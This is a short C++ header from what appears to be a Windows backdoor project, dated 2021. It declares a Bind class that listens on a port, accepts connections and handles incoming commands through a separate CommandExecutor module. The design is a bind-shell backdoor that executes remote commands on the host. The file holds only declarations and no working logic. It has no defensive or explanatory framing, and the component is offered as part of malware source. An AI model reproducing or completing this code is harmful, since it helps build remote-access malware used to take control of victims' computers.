//
// Created by stdout on 2021/4/5.
//

#ifndef BACKDOOR_BIND_H
#define BACKDOOR_BIND_H

#include "winsock2.h"
#pragma comment(lib,"ws2_32.lib")

#include "string"
#include "iostream"

#include "../CommandExecutor/CommandExecutor.h"


// ret
#define NO_CONNECTION 0
#define CLOSE_CONNECTION 1
#define CLOSE_SOCKET 2
#define WAIT_FOR_OTHOR 3
#define EXECUTE_COMMAND 4

// model
#define STOP_MODEL 1
#define CONTINUE_MODEL 2



typedef struct {
    int model;
    int ret;
}RET;

class Bind {
public:

    static bool start(int port);



private:
    static SOCKET listen(int port);
    static int NewConnection(SOCKET client);
    static SOCKET AcceptConnection(SOCKET server);
    static void CloseSocket(SOCKET socket);
    static RET PreDealCommand(char *cmd);
};


#endif //BACKDOOR_BIND_H
